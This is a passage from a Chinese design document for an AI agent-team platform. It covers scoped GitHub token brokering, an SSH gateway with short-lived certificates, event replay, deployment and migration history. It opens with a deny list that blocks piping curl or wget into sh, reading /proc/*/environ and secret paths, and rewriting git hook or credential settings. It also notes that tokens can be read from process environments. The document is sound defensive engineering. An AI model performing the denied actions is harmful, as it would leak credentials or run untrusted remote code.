- 固定拒绝名单（策略 ⓪，§9）：Read/Edit/Bash 涉及上述秘密路径；`curl|wget … | sh`；`git config` 改 `core.hooksPath`/`credential.*`；读 `/proc/*/environ`。名单写在控制台代码里，守护进程的 PreToolUse 钩子也用同一份名单先拦一道。
- 平台的 git 钩子目录（`core.hooksPath`，§8.1）、gh 包装脚本和下载的 gh 放在员工不可写的目录（`<data>/agent-teams/platform`、`tools`）。

### 10.4 GitHub 凭证不落盘

v1 在每次运行开始把 `GH_TOKEN` 放进环境。v2 会话是常驻的，安装令牌 1 小时就过期，所以改为**按需取**：

- 守护进程给每个会话设置 `GIT_CONFIG_COUNT/KEY/VALUE`：`credential.https://github.com.helper` 先清空，再设为 `!<node-bin> git-credential --session <sid>`；`GIT_TERMINAL_PROMPT=0`。
- `git-credential` 子命令通过守护进程的本地 unix socket（`$XDG_RUNTIME_DIR/agent-teams/cred.sock`，与守护进程主 socket 分开）请求凭证，请求里带会话打开时生成的每会话秘密（放在 `GIT_CONFIG_VALUE` 的 helper 参数里），守护进程用 `timingSafeEqual` 核对。socket 的保护是“所在目录 0700 且必须属于守护进程账号 + socket 0600 + 每会话秘密”；**不**核对对端 uid（`SO_PEERCRED`）：Node 的 `net` 模块读不到对端凭证，而且在 `none`/`sandbox` 级别对端 uid 就是守护进程自己，核对了也区分不了（`agent_user` 级别再考虑，见 `remote-servers.md` §8.2）。守护进程向控制台发 `cred.request {session_id, host, repo}`，控制台核对节点归属（协议 §8）、该会话属于哪个项目、仓库是否匹配，返回**缩小过的**安装令牌（剩余 < 10 分钟就换新）和它**真实的**到期时间，守护进程内存缓存到过期前 5 分钟；git 认证失败调 `erase` 时，守护进程丢掉这个会话这个仓库的缓存，下一次 `cred.request` 带 `force_refresh`，让控制台跳过自己的令牌缓存重新铸造（每个令牌范围每分钟最多一次）；会话结束时丢掉该会话的全部缓存。
- **按仓库、按角色缩小令牌**：GitHub 允许铸造只针对指定仓库和部分权限的安装令牌（`POST /app/installations/{id}/access_tokens {repositories: [name], permissions: {...}}`）。员工会话（组长和成员，含只读岗位）拿到的令牌（`ghops.ScopeEmployee`）：`{contents: write, pull_requests: write, issues: write, checks: read（App 有时）, metadata: read}`，项目允许改 workflow 时加 `workflows: write`；每个令牌只含请求的那一个仓库，且控制台只给本项目绑定的仓库（`repo_not_in_project`）。统筹不设 helper、拿不到任何令牌（`coordinator_has_no_credentials`）。`cred.request` 的 `purpose` 对会话不起作用。平台作业照旧：准备作业只读、推送作业 `{contents: write}`、控制台侧合并队列/PR/合并用完整权限（只在控制台进程内）。PAT 连接无法缩小：2026-11-17 起员工会话也直接拿 PAT（节点是用户自己的；用户明确要求员工都能用 gh），项目设置仍建议改用 GitHub App 连接，这样令牌只有 1 小时、只含一个仓库。
- **能做什么、不能做什么**：员工能 fetch、推送非保护分支、开 PR/评论/审查、看 CI；推送基准/默认/讨论串分支由 pre-push 钩子拒绝（§8.1）。2026-11-19 起（用户：“成员可以进行 gh 合并，去掉限制”）成员可以用 `gh pr merge`、`gh api …/merge` 合并 PR（可批量），PreToolUse 不再拒绝；组长是只读会话，argv 白名单里没有 `gh pr merge`，要直接合并时派给成员。平台照常识别在别处合并的 PR（检查时 PR 已合并按通过算，webhook 记 `Merged`）。这些是给出清楚报错的软防线，硬防线是 GitHub 规则集（App 是唯一绕过者；规则集要求的审批或检查没满足时，成员的 gh 合并会被 GitHub 拒绝）。
- `gh`：员工节点通常没装 gh。守护进程启动时（以及第一次用时）把锁定版本的官方发行包（`git/gh-install.ts`，`gh 2.103.3`，linux amd64/arm64 tar.gz、macOS zip）下到 `<data>/agent-teams/tools/gh-<ver>/`，sha256 必须同时等于代码里锁定的值和该发行版的 `gh_<ver>_checksums.txt`；PATH 上已有 gh 时直接用。会话 PATH 最前面是平台目录 `<data>/agent-teams/platform/bin`（员工不可写），里面的 `gh` 包装脚本执行 `agent-teams-node gh`：通过 cred socket（`op: "gh"`，带每会话秘密）向守护进程要真实 gh 的路径、一个空的每会话 `GH_CONFIG_DIR`（`<data>/agent-teams/gh-config/<session>`，会话结束删除，不在 worktree 里）和令牌，再以 `GH_TOKEN`/`GITHUB_TOKEN`、`GH_HOST=github.com`（会话没设时）、`GH_PROMPT_DISABLED=1`、`GH_NO_UPDATE_NOTIFIER=1` 运行真实 gh；继承来的 `GH_TOKEN`/`GITHUB_TOKEN`/`GH_ENTERPRISE_TOKEN`/`GITHUB_ENTERPRISE_TOKEN` 先删掉，github.com 的令牌不放进企业版变量，子进程环境里也删掉 `AT_CRED_SECRET`。令牌只存在于那一次 gh 进程的环境里，不进会话环境、不写任何文件（gh 用 `GH_TOKEN` 时不写 `hosts.yml`，`gh auth login` 在 `GH_TOKEN` 存在时拒绝保存）；残余风险：gh 运行期间，同账号的进程能读 `/proc/<pid>/environ`。仓库按 `-R/--repo`、`GH_REPO`、cwd 的 origin、员工目录下唯一的仓库子目录依次确定；确定不了时 gh 照常运行但不带令牌，并在 stderr 说明。系统提示词告诉组长和成员 gh 已安装并自动带令牌、讨论串 PR 用 `open_pr`；成员按任务要求可以用 `gh pr merge` 合并，组长要合并时派给成员。
- **已知限制**：`sandbox` 隔离级别的节点上，Bash 沙箱的 `denyRead` 包含 `$XDG_RUNTIME_DIR/agent-teams`（cred socket 所在目录），沙箱里的 git/gh 连不上 socket，拿不到令牌（与之前的只读令牌相同，尚未解决）；`none`（目前生产的两台节点）和 `agent_user` 不受影响。
- 远程服务器（SSH）访问见 §10.6 与 `remote-servers.md`；GitHub 凭证的后续收敛见 `remote-servers.md` §10。

### 10.5 秘密与密钥

- `AGENT_TEAMS_SECRET_KEY` 沿用；Go 实现与 v1 相同的派生（`derive(label) = sha256("label:secret")`），OAuth state 签名格式完全一致，迁移期两边签发的 state 互认。
- 平台级第三方密钥（语音输入的 OpenAI Key）同样用 SecretBox 密封存在 `at_settings`，接口只回末四位；只在控制台向 OpenAI 签临时密钥时解开，不下发给浏览器或节点，日志和审计里不出现；改接口地址必须重填 Key。
- 新增密钥轮换：`AGENT_TEAMS_SECRET_KEYS=new,old`（第一个加密，全部可解密）+ `atctl admin reseal` 重新加密全部密封值（v1 问题 14）；远程服务器凭证和 SSH 网关密钥用信封加密（`server/internal/credvault`，data-model.md §2.14），reseal 只重新包裹它们的 DEK。

### 10.6 远程服务器：主节点 SSH 网关

员工会话经主节点的 SSH 网关（`server/internal/sshgw`，`golang.org/x/crypto/ssh`）连用户在设置里配置、项目选用并按岗位授权的服务器（`remote-servers.md` §4、§5、§6.4、§7.7、§9.4，`protocol.md` §8.1，表见 `data-model.md` §2.14）。服务器的密码和私钥**只在控制台进程内存里解开**，节点上没有任何服务器凭证。

- **两把平台密钥**：会话 CA（`ssh_session_ca`）和网关 host key（`ssh_gateway_host_key`），存 `at_settings`、按信封加密密封，第一次用时由 `credvault.EnsureKey` 生成（多副本只会留一把），网关进程内缓存。
- **会话证书**：守护进程在内存里生成临时 Ed25519 密钥，发 `ssh.cert_request`；网关的归属校验（`nodegw/owner.go` 的 `checkSession`）之后，`sshgw.Gateway.CertRequest` 在 goroutine 里处理（最多 16 个同时进行，占满时丢弃并记 WARN，守护进程会重发），再查一遍会话（本节点、未关闭、`open_gen` 是当前值、项目所有者 = 节点所有者）。principals = 会话岗位此刻被授权的服务器名，没有就回 `no_servers`。证书有效期 10 分钟（`ValidAfter` 提前 60 秒），扩展带 `permit-pty` 和 `session@` / `gen@` / `node@agent-teams.dev`，不带 critical option；签发前先写 `at_ssh_certs` 行，serial 就是证书序号。`ssh.cert_response` 带 known_hosts 行 `agent-teams-gateway <host key>`。
- **`GET /nodes/ssh`**：WebSocket 升级，二进制帧，每条连接一个 WebSocket。节点令牌认证同 `Gateway.Authenticate`（`policy.csv` 的 `node-token` 行）；请求头 `X-AT-Session` / `X-AT-Open-Gen` / `X-AT-Server` 在升级前就要满足：会话属于该节点、未关闭、gen 是当前值（否则 404），服务器此刻授权给它（`store.SessionServerGrant`，否则 403 并记 `denied`），连接数没超限（否则 429）。
- **前段 SSH**：只开公钥认证，只认会话 CA 签的用户证书（`ssh.CertChecker`：有效期、principal = 用户名 = 服务器名、无 critical option），再核对扩展里的会话 / gen / 节点、库里 serial 存在且未吊销、行里的会话 / gen / 节点 / 公钥指纹一致、会话仍活着且 gen 未变。失败一律记一行 `auth_fail`。
- **逐次授权**：每个 channel 打开时、每 30 秒、每次收到 `ssh:revoke` 提示都重新查库（证书未吊销 + `SessionServerGrant`：会话活着、gen 未变、岗位仍被授权、不是统筹 / 组长 / 只读岗位，只读的口径是 `read_only = true` 或 gate 为 review / decision）。不满足就拒绝新 channel，并向已开的 channel 的 stderr 写原因、发 `exit-status 255`、断开整条连接。
- **后段 SSH**：第一个 channel 打开时，按库里**最新**的配置拨号（一个前段连接对应一个后段连接）。host key 必须等于用户确认过的 `host_key`，而且它的 MAC（`credvault.HostKeyMACData`）要能验过，否则不拨号，提示用户先在设置里“测试连接”；拨通后看到的 host key 不一致，就在发送凭证之前断开，记 `host_key_mismatch`（含新旧指纹）。登录用解开的密码（同时作为 keyboard-interactive 唯一一个不回显问题的回答）或私钥（加口令）。
- **转发的范围**：`exec`、`shell` + `pty-req`、`window-change`、`signal`，`env` 只放行 `LANG` / `LC_*`，子系统只放行 `sftp`（scp / rsync 都能用）。端口转发（`direct-tcpip`、`tcpip-forward`）、agent 转发、X11 和其他子系统一律拒绝，记 `denied`。目标发来的 `exit-status` / `exit-signal` 原样转回。
- **限额与超时**（`sshgw.Config`，§5.7 的简化版，按副本计数）：每会话 4 条、每台服务器 8 条、每项目 16 条；前段握手 15 秒，后段拨号加登录 20 秒；空闲 30 分钟断开，单条最长 6 小时；两段都每 30 秒发一次 `keepalive@openssh.com`，WebSocket 每 30 秒 ping 一次。
- **吊销**：`core.CloseSession`、`core.BumpOpenGen`（吊销旧 gen 的证书）和 `core.SetSessionState(crashed)` 在同一个事务里把证书标 `revoked_at`，提交后在 `ssh:revoke` 频道发提示（`fanout.Patterns` 含 `ssh:*`，经 Valkey 跨副本）。服务器被删除或改名、从项目里移除、岗位授权被撤销时，由 store 函数返回被吊销的 serial，调用方再调 `Engine.SSH.Revoked(ctx, serials)` 广播。提示本身只是“马上复查”，网关以库为准；广播丢了，也会在 30 秒的周期复查里断开。项目被删除时证书行随之级联删除，复查时就会断开。
- **授权变化通知**：`Engine.SSH.ServersChanged(ctx, projectID)` 给项目里所有可用服务器的存活会话发可靠的 `ssh.servers_update`。`version` 取毫秒时间戳，在进程内严格递增。节点重连时（`router.NodeOnline`）给它的每个存活会话补发一次。`session.open` 的 `ssh_servers` 由 `sshgw.SessionServers` 在 `Orchestrator.queueOpen` 的事务里算出；只有节点 hello 带 `ssh_gateway` 时才填。
- **审计**：`connect` / `disconnect`（时长、两个方向的字节数、断开原因）、`exec` / `shell` / `subsystem`（每个 channel 一行：命令、退出码或信号、时长、字节数、pty）、`denied`、`auth_fail`、`host_key_mismatch` 都写 `at_ssh_audit`。命令先过 `sshgw.Redact`：`node/src/util/redact.ts` 的规则，加上 URL 里的 `user:pass@`、`--password=` / `--token` 这类参数、`*PASSWORD*=` 这类环境变量、`mysql -p…`、`sshpass -p`，最后把服务器自己的密码和口令按值替换成 `***`。连接结束时再写一行 `at_events`（`type = server`，`core.EvServer`），payload 带 `summary`，例如“dev-1 在 prod 上执行了 docker compose up -d（退出码 0，12s）”，讨论串动态里能看到。
- **第一期不做**：人工批准卡片、端口转发、agent / X11 转发、录屏、按 sftp 操作逐条审计、拨号前的目标地址检查（`Config.Dial` 留了接口）。另外连接数是按副本计数的，没有放进 Valkey。

## 11. 状态监控、事件落库与回放

### 11.1 事件分两类

| 表 | 内容 | 用途 |
| --- | --- | --- |
| `at_events` | 项目内所有“发生了什么”：消息、任务变化、提问/审批、留言、计划、交付物、合并/CI、讨论串状态、员工活动（工具开始/结束的摘要） | 项目 SSE、动态面板历史 |
| `at_status_events` | 员工状态变化：`{employee, tier, role, state, substate, bubble, task_id, task_kind, cause}` | 办公室实时与回放 |

**两张表共用一个按项目递增的序号 `seq`**：写事件的事务里先 `UPDATE at_projects SET event_seq = event_seq + 1 WHERE id = $1 RETURNING event_seq`，再插入事件行。行锁持有到提交，所以同一项目的事件**按 seq 顺序提交**，不会出现“小 id 晚提交、被已推送的大 id 跳过”的情况（IDENTITY 是插入时分配、不是提交时）。代价是同一项目的写事件事务串行化：写事件的事务都要短，事件插入放在事务最后一步。SSE 的 `id:` 就是 `seq`，续传时两张表按 `seq > last` 合并读取，一个游标同时覆盖两类事件。

两张表都按月分区（`PARTITION BY RANGE (created_at)`），`atctl` 每天建下月分区、按保留期删旧分区（默认 `at_events` 180 天、`at_status_events` 30 天）。

### 11.2 管线

```
SDK 消息 / hooks / Codex 通知
   │ 守护进程归一化（不判断状态，只描述事实）
   ▼
session.event {kind: turn_started|turn_ended|tool_started|tool_ended|thinking|text|
               compacting|rate_limited|error|subagent_started|subagent_stopped, tool?, category?, summary?}
   │ WS（seq + ACK，可重放）
   ▼
控制台 status 引擎 ◄── 任务板事件（claimed / done）、审批/提问（open / closed）、节点上下线、set_status
   │ 状态机（下表），去抖 800 ms（避免一次 Read 闪一下）
   ▼
at_status_events（落库） → at_employee_status（每员工最新一行，upsert） → Valkey PUBLISH project:<pid>
   ▼
SSE event: status → 网页办公室
```

守护进程侧的事实来源：Claude 用 `assistant` 的 `tool_use` 块 + `PreToolUse/PostToolUse/PostToolUseFailure` 钩子（工具开始/结束）、`Stop` 钩子和 `result` 消息（回合结束、费用、用量）、`system/status: compacting`、`rate_limit_event`、`api_retry`、`SubagentStart/Stop`；`system/init` 每回合一次，当作 turn_started。**不依赖** `session_state_changed`（实测没出现）。Codex 用 `turn/started|completed`、`item/started|completed`（`commandExecution`、`fileChange`、`mcpToolCall`、`agentMessage`）、`thread/status/changed`（`waitingOnApproval`）。

工具类别（守护进程打标签，控制台映射状态）：`Edit|Write|NotebookEdit|fileChange` → `edit`；`Read|Glob|Grep|WebFetch` → `read`；`Bash|commandExecution` → `shell`，并按命令识别子类 `test`（`pytest|go test|npm test|vitest|cargo test…`）、`git_commit`、`git_push`、`ci`（`gh run|gh pr checks`）、`install`；`mcp__platform__*` → `platform`。

### 11.3 状态机

优先级从高到低，第一个成立的决定状态：

| 状态 | 条件 |
| --- | --- |
| `offline` | 员工所在节点离线 |
| `broken` | 会话错误未恢复（`session.error`、认证失败、连续崩溃） |
| `raising_hand` | 该员工有 open 的审批或阻塞型提问（user 或 lead） |
| `queued` | 有消息或任务要处理，但节点活跃会话数已满，守护进程把它排在队里（`session.state queued`，办公室显示“排队等工位”） |
| `walking_to_board` → `claiming` → `returning` | `task.claimed` 之后的固定动画序列（时长由布局 JSON 的路径长度决定，控制台只发一次 `claimed`，动画在前端播放；状态表里记 `claiming`） |
| `typing` / `reading` / `running` | 最近一个 `tool_started` 的类别为 edit / read / shell（`running` 带子类：测试、提交、看 CI） |
| `thinking` | 回合进行中、没有工具在跑 |
| `waiting` | 有已领取任务但依赖未满足 / 在合并队列等 CI / 等审查 |
| `idle` | 无任务、无回合 |

`set_status(text, kind?)` 只改气泡文字（保留 10 分钟或到下一次 set_status / 任务变化），不改状态和位置。员工提示里要求“切换工作内容时调用 set_status，用一句中文描述在干什么”。没有 set_status 时气泡由平台生成（“改 PlanList.tsx”“跑 pytest”“领取 t8 …”）。

### 11.4 实时扇出与回放

- 写入顺序：先在事务里分配 `seq` 并写 `at_events`/`at_status_events`，提交后 `PUBLISH project:<pid> {seq, type}`（只带 seq 和小负载；大负载 SSE 层回表读）。SSE 层对每个连接记住已发出的最大 seq，Valkey 通知只当“有新事件”的提示，真正发送的是回表查到的 `seq > last` 的行，所以通知乱序或丢失都不影响。Valkey 断了不丢：SSE 连接重连时用 `Last-Event-ID`（= seq）从 PG 补。用户级事件流（`/api/events`）同理用 `at_users.event_seq`。
- 每条状态事件带 `tier`、`role`、`task_kind`（领取时从任务复制），回放旧任务时不需要回查任务表就能匹配布局规则的 `taskKind`。
- 回放：`GET /api/projects/{pid}/office/replay?from&to` 返回该时段开始时刻的状态快照（从 `at_status_events` 取每员工 `from` 之前最后一条）+ 时段内事件；前端按时间轴 1×/4×/16× 播放，复用实时渲染器。
- 节点命令跨副本：命令先写 `at_node_commands`，再 `PUBLISH node:<id>:cmd`；持有该节点链路的副本收到后发送。

## 12. 部署

### 12.1 compose 服务（同一台机器，沿用 PG17 + Valkey 9.1.2）

| 服务 | 镜像 | 说明 |
| --- | --- | --- |
| `control-plane` | `agent-teams-server:<ver>`（多阶段：`node:22-alpine` 构建 web → `golang:1.25` 构建 → `gcr.io/distroless/static:nonroot`） | `atctl serve`，端口绑定 `${BIND:-127.0.0.1}:${PORT}:${PORT}`，容器内也监听 `PORT`（与 v1 的 `agent-teams` 服务同一写法，对 Caddy）和内网 `:9090`（metrics）；启动前 `atctl migrate up`（单独的一次性服务 `migrate`，`depends_on: service_completed_successfully`）。distroless 里没有 shell 和 curl，健康检查用二进制自带的子命令：`healthcheck: {test: ["CMD", "/atctl", "healthcheck"], interval: 10s, timeout: 3s, retries: 6, start_period: 20s}`（`atctl healthcheck` 请求 `http://127.0.0.1:$PORT/healthz`，非 200 退出 1） |
| `migrate` | 同上镜像，`command: ["migrate","up"]` | 迁移只在这里跑，主服务不跑 DDL |
| `postgres` | `postgres:17-alpine` | 不变 |
| `valkey` | `valkey/valkey:9.1.2` | 不变 |

- 办公室布局：`./office:/srv/office:ro` 挂进 control-plane，`OFFICE_LAYOUT_DIR=/srv/office`，fsnotify 监听。
- 守护进程发布包：镜像内 `/srv/node-dist/agent-teams-node-<ver>.tgz`，由 `/node/dist/` 提供；`install-node.sh` 从控制台下载（不再从 GitHub 分支 pip 安装）。
- Caddy：`reverse_proxy 127.0.0.1:PORT { flush_interval -1 }`。WebSocket（`/nodes/*`）Caddy 自动支持，不需要额外路由规则。
- 部署与升级：`deploy/compose.sh`（项目目录 = 仓库根，env 文件默认 `<repo>/.env`，样例 `deploy/env.example`）。升级时先 `migrate` 再起 `control-plane`（compose 依赖已保证），步骤见仓库 README。

### 12.2 环境变量

沿用 `AGENT_TEAMS_PUBLIC_URL`、`DATABASE_URL`、`VALKEY_URL`、`AGENT_TEAMS_SECRET_KEY`（新增可选 `AGENT_TEAMS_SECRET_KEYS`）、`AGENT_TEAMS_ADMIN_EMAILS`、`PORT`；新增 `OFFICE_LAYOUT_DIR`、`METRICS_ADDR=:9090`、`OTEL_EXPORTER_OTLP_ENDPOINT`（可选）、`GITHUB_WEBHOOK_SECRET`（可选）、`AGENT_TEAMS_ARTIFACT_ORIGIN`（可选，发布文件的独立源，见 §6.5）。v2 不再支持“没有 DATABASE_URL 就用内存”：没有 PG 直接拒绝启动（测试用 testcontainers）。

## 13. 可观测性

- **日志**：控制台 `slog` JSON，每条带 `request_id`、`user_id`、`project_id`、`thread_no`、`node_id`、`session_id`；守护进程 `pino` 同字段，关键日志（会话崩溃、认证失败、协议错误）也通过 `log` 消息回传控制台，存 `at_node_logs`（保留 7 天），节点页可看。
- **指标**（Prometheus）：HTTP 延迟/错误、SSE 连接数、节点在线数、WS 消息速率与 ACK 延迟、发件箱积压、活跃/停放会话数、回合时长、审批等待时长、任务池等待时长、合并队列时长、CI 结果、GitHub API 剩余额度、Agent SDK `rate_limit_event` 次数、按员工/项目的估算费用（`total_cost_usd`）和 token 用量。
- **成本**：`result` 里的费用和 usage 落 `at_usage`（按会话/回合），项目首页显示本讨论串估算花费（订阅账号下只是估算，界面写明）。
- **追踪**（可选）：OTel，HTTP → 引擎 → 节点命令用 `trace_id` 贯通（协议信封里带 `trace`）。
- **健康**：`/healthz`（进程活着）、`/readyz`（PG、Valkey 可用、迁移版本匹配）。

## 14. 分阶段交付与迁移（不停机）——历史

> **已完成，仅作历史。** v2 于 2026-11-15 一次性切换上线，Python v1 已退役，代码已从仓库删除；迁移 `00120_drop_v1` 删掉了 v1 独有的表、列和旧对话（data-model.md §3.1）。下面的内容描述当时的迁移设计，其中提到的代理、防护补丁、协议 1 兼容、旧对话只读页都不存在。

> **决定（2026-11-14）：改为一次性切换。** 生产库目前只有 1 个用户、2 个节点、1 个项目，按用户逐个灰度、Go 反向代理 Python、Python 防护补丁和内部接口（§14.1 第 1、2、4、7、8 条，§14.5，§14.6 中与代理有关的步骤）的成本远大于收益，全部不做。做法：v2 在仓库里独立开发并在 rc 上用 docker compose 端到端测通 → 生产库副本上跑 `atctl migrate up`（原表原地扩展，见 data-model.md）并验证 → 生产停 Python、跑迁移、起 Go（同端口，Caddy 不改）→ 节点换 TS 守护进程（令牌不变）。保留 Python 镜像 `agent-teams:rollback-<sha>` 和迁移前的库状态用于回滚；v1 的旧对话在 v2 里只读呈现。下文保留原设计作参考，与本决定冲突处以本决定为准。

### 14.1 原则

1. **Go 做前门，Python 退到后面**：Caddy 只指向 Go；Go 没实现或该用户还在 v1 的请求，反向代理给 Python（HTTP、SSE、WebSocket 都用 `httputil.ReverseProxy`，SSE 设置 `FlushInterval: -1`）。
2. **分流规则（按顺序，第一条命中的生效）**：
   1. **按路径，与用户无关**：`GET|POST|DELETE /mcp`（以及 `/mcp/*`）**始终代理给 Python**，直到 P6。进行中的 v1 运行用内存里的 MCP bearer 令牌（不是会话 cookie）调用 `<PUBLIC_URL>/mcp`，Go 无法、也不需要把它对应到用户；v2 没有 `/mcp`。这条代理用 `FlushInterval: -1`、**不设响应超时**、不缓冲请求体：v1 的 `ask_user`、`approve` 等调用最长可阻塞 86400 s，期间每 30 s 有保活。Go 的 `http.Server.WriteTimeout` 对这条路径关闭（用 `http.ResponseController` 逐请求清除截止时间）。
   2. **按路径**：`/nodes/connect` 先读 hello 再按节点所有者分流（§14.3、协议 §11）。
   3. **按用户**：`at_users.platform_version`（1 | 2，默认 1）。Go 已实现的接口（P1 起的账号、项目、节点、Git、管理）对所有用户由 Go 处理；其余接口对 v1 用户代理给 Python，对 v2 用户由 Go 处理。管理员在 Admin 页切换。
3. **共用数据库，只加不改**：Python 启动时会跑自己的幂等 DDL。v2 迁移在 Python 退役前**只新增表和列（带默认值）**，不改不删 v1 用到的列和约束，不加 v1 写入会违反的约束。v1 会读的表（`at_users` 等）两边语义一致。
4. **v1 必须看不见 v2 的数据（v1 防护补丁，P3 之前上线）**：“只加不改”挡不住语义冲突。v2 的讨论串任务和 v1 共用 `at_tasks`，也用 `pending`/`running`；而 v1 每次启动都跑 `Hub.recover()`：`store.unfinished_conversations()` 是 `SELECT DISTINCT conversation_id FROM at_tasks WHERE status IN ('pending','running')`，不按所有者也不按对话类型过滤，随后对每个对话 `_ensure_live`/`_recover`，用用户的 v1 YAML 团队接管、重跑或改成 `failed`（`INTERRUPTED`），再 `abandon_waiting()` 取消 v2 的提问。v1 的 `GET /api/conversations` 也会把统筹和讨论串对话当普通对话列出来。因此在 Python 上线一个小补丁（见 §14.5 的清单），**作为 P1 的退出标准之一，且必须在 `00010_threads` 迁移之前部署**：
   - 所有“列出 / 恢复 / 懒加载对话”的查询只看 `at_conversations.kind = 'chat'` **且** 所有者 `platform_version = 1`：`unfinished_conversations`（`JOIN at_conversations c ON c.id = t.conversation_id JOIN at_users u ON u.id = c.user_id WHERE c.kind = 'chat' AND u.platform_version = 1`）、对话列表、`_ensure_live`（非 chat 或 v2 用户的对话直接 404，不建 Leader）、`comms.restore` 加载的提问与留言、任务列表。
   - Python 自己的启动 DDL 加上 `ADD COLUMN IF NOT EXISTS kind TEXT NOT NULL DEFAULT 'chat'`（`at_conversations`）和 `platform_version SMALLINT NOT NULL DEFAULT 1`（`at_users`），这样补丁不依赖 Go 迁移的先后（Go 的 `00002` 也加同样的列，两边幂等）。
   - 补丁版 Python 启动时写 `at_settings.platform.legacy_guard = 1`；Go 的 `atctl migrate` 在执行 `00010_threads` 前检查它，没有就拒绝（防止顺序搞错）。
   - Python 的 `TaskView` 对未知状态值（`claimed`、`merging`、`blocked`…）不抛异常（补丁里改成 `str`），作为第二道保险。
   - **CI 冒烟测试**（每个迁移和每次 Python 改动都跑）：种入一个 v2 用户、一个讨论串、`running`/`pending`/`claimed` 的任务、open 的提问和留言 → 重启 Python v1 → 断言这些行一字未改、v1 对话列表里没有它们、没有为它们建 Leader。
5. **节点令牌不换**：哈希方式相同（sha256 hex）；新守护进程读取旧 `node.env` 里的令牌。
6. **GitHub App 路径不变**：Go 实现 `/api/git/github-app/created`、`/installed`、`/install` 与 v1 完全一致，签名 state 互认。
7. **Go 接管的写接口如果在 Python 内存里有副作用，必须同时通知 Python**（§14.5）。
8. **CSRF 分段上线**（§10.1）：v1 网页下线前，没有令牌的 cookie 写请求按同源头放行。

### 14.2 阶段

| 阶段 | 内容 | 用户可见变化 | 退出标准 |
| --- | --- | --- | --- |
| **P0 基线**（约 1 周） | monorepo 布局；`/protocol` schemas 与生成；goose 基线迁移 `00001_v1_baseline.sql` = v1 现有 DDL 的 `IF NOT EXISTS` 版（对生产是空操作，只登记版本）；CI（Go test + sqlc vet + web build + node test + gen diff） | 无 | 在生产库副本上 `migrate up` 无变化 |
| **P1 Go 前门**（约 2 周） | **Python 补丁先上**（§14.1 第 4 条的数据隔离 + §14.5 的内部接口）；Go 实现：认证（scrypt 校验、同一 cookie 与 `at_sessions`）、`/api/me`、项目、Git 连接、GitHub App 全流程、节点 CRUD 与令牌轮换、管理、`/api/team` 读写（仍是 YAML，写 `at_teams`）、`/install-node.sh`；有 Python 内存副作用的写接口按 §14.5 通知 Python；`/mcp` 和其余全部代理给 Python；CSRF 用同源检查（§10.1）；按 §14.6 切换 compose | 无（同一个网页） | 契约测试：录制的 v1 API 请求在 Go 与 Python 上响应一致；**CSRF**：v1 网页无令牌的写请求通过、跨站 Origin 被拒；**MCP**：经代理的 `/mcp` 阻塞调用挂 10 分钟（带 30 s 保活）后正常返回；**副作用**：停用用户、删节点、删 GitHub App、轮换令牌后 Python 侧的对话/MCP 令牌/提问/节点链路/令牌缓存都已清掉，`GET /api/nodes` 的 `online`/`active`/`since` 与 Python 一致；**v1 防护补丁**的冒烟测试通过；生产灰度 3 天无 5xx 增加 |
| **P2 新守护进程**（约 2–3 周，可与 P3 并行） | TS 守护进程：协议 1 兼容（`start/output/exit/cancel`、按 run_id 幂等、磁盘日志重放、退出码约定全同 v1）+ 协议 2；`install-node.sh` v2 原地升级（见 14.3）；控制台按 hello 协商协议 | 节点页显示新版本 | 生产节点全部换成新守护进程，v1 会话照常运行一周 |
| **P3 v2 核心**（约 4 周） | 岗位模板（YAML → 模板的 Go 迁移，旧格式自动转换规则同 threads.md）、统筹、讨论串、员工实例、常驻会话（Claude SDK + Codex app-server）、平台工具、任务池、审批卡片（canUseTool）、事件落库 + 项目 SSE、员工状态管线；网页 Main / Overview / Thread / Team / NewProject / ProjectSettings / Nodes / Mobile。前提：v1 防护补丁已在生产 | 管理员把自己和试用用户切到 v2 | 内部用户用 v2 完成真实讨论串到 PR；审批、断线、控制台重启、守护进程重启、节点重启、**Python 重启**的故障演练都通过 |
| **P4 交付流程**（约 3 周） | worktree、合并队列、CI（轮询 + 可选 webhook）、PR、验收、清理、交付物、项目记忆、审查/决策关卡 | v2 用户可用 | 同一仓库两个讨论串并行跑通合并队列和 CI 失败自动修复 |
| **P5 办公室**（约 2–3 周） | 布局 JSON + Schema + 默认布局、渲染器、寻路、状态 → 位置、回放、岗位形象（look）、布局热更新 | 办公室页上线 | 改 `office/default.json` 后打开的页面 2 秒内重画；回放 1 小时数据流畅 |
| **P6 全量切换与退役** | 逐批把用户切到 v2；旧对话在 v2 里作为“旧对话（只读）”可查看；全部切完后删除 `legacy` 服务和代理代码（含 `/mcp` 路径规则）；CSRF 改为全部要求令牌；之后的迁移才允许删 v1 专用列（`at_teams` 等保留只读一个版本） | 所有人 v2 | Python 下线 2 周无回滚需求 |
| **P7 加固** | 节点密钥对认证、多副本、密钥轮换、配额与限流细化 | — | — |

办公室需求用户已明确提出，P5 可以提前到与 P4 并行（状态管线在 P3 已具备，渲染器只依赖 `status` 事件和布局 JSON）。

### 14.3 节点原地升级

- 目录：`~/.local/share/agent-teams/node-<ver>/`（每个版本一份）+ 软链 `~/.local/share/agent-teams/current → node-<ver>`。
- `install-node.sh` v2：如果存在 `~/.config/agent-teams/node.env`，读取其中的 `AGENT_TEAMS_NODE_TOKEN`、`CONSOLE`、`ROOT`、`MAX_RUNS`（→ `max_active_sessions` 的初值），**不需要用户再复制令牌**；检查 Node ≥ 22（没有就提示用 nvm / 发行版包安装，或下载官方 tarball 到 `~/.local/share/agent-teams/nodejs`）；从控制台下载 tgz 和签名，校验后解到 `node-<ver>/` 并 `npm ci --omit=dev`（拉 Agent SDK 平台包约 366 MB）；把 `current` 指向它；systemd 单元写成 **`ExecStart=<node 绝对路径> %h/.local/share/agent-teams/current/dist/node.mjs`**（单元里不出现版本号）；`--agent-user` 时额外建 `at-agent` 用户和 sudoers 规则（§10.3）；保留旧 venv 和上一个 `node-<ver>/` 各一个版本以便回滚。
- 升级与回滚都只改软链：`node.upgrade` 解包新版本后原子替换 `current`（`ln -sfn` 到临时名再 `rename`），`exit 75` 让 systemd 重启就跑新版本；`install-node.sh --rollback` 把 `current` 指回上一个版本（从 Python 守护进程升级来的节点，回滚则恢复旧单元文件指向 venv）。
- 节点页提供“升级”按钮：控制台给在线节点发 `node.upgrade {version, sha256, signature}`，下载地址固定为控制台自己的 `/node/dist/`（协议 §9），守护进程校验 sha256 和发布签名后切换（P2 末期提供）。
